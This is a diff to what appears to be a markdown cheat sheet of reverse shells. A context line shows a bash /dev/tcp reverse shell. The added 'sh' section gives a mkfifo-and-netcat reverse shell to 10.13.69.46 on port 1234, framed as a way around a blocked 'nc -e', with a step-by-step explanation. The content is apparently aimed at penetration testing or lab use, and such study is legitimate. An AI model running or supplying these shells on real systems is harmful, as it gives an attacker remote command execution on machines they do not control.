@@ -68,3 +68,19 @@ if __name__ == "__main__":
 
 bash -i >& /dev/tcp/<IP>/<port> 0>&1
 ```
+
+## sh
+
+This works when bash cant be called and the `nc -e` option is blocked by bypassing it with file redirection
+```sh
+#!/bin/sh
+rm -f /tmp/fifo && mkfifo /tmp/fifo
+cat /tmp/fifo | /bin/sh 2>&1 | nc 10.13.69.46 1234 > /tmp/fifo
+```
+### Explanation:
+
+- `mkfifo /tmp/fifo`: Creates a named pipe (FIFO) at `/tmp/fifo` for communication.
+- `cat /tmp/fifo`: Reads from the named pipe (which gets its input from the shell).
+- `/bin/sh 2>&1`: Runs a shell, redirecting both stdout and stderr to the pipe.
+- `nc 10.13.69.46 1234`: Establishes a connection to the target IP and port.
+- `> /tmp/fifo`: Sends the input from the remote connection back into the pipe.
